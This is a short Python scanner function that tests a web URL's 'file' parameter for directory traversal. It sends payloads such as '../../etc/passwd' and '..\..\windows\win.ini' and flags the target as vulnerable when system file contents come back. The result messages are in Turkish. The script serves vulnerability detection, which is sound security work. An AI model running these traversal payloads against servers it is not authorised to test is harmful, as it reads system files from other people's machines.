
import requests

COMMON_PATHS = [
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "../../../../../../etc/passwd",
    "../../../../../../windows/win.ini"
]

def check_directory_traversal(url):
    results = []
    for payload in COMMON_PATHS:
        try:
            test_url = f"{url}?file={payload}"
            response = requests.get(test_url, timeout=5)
            if "root:x" in response.text or "[fonts]" in response.text:
                return {
                    "status": "vulnerable",
                    "payload": payload,
                    "explanation": "Directory Traversal açığı mevcut. Sunucudan dosya okundu."
                }
        except Exception:
            continue
    return {
        "status": "safe",
        "explanation": "Directory Traversal açığı tespit edilmedi."
    }
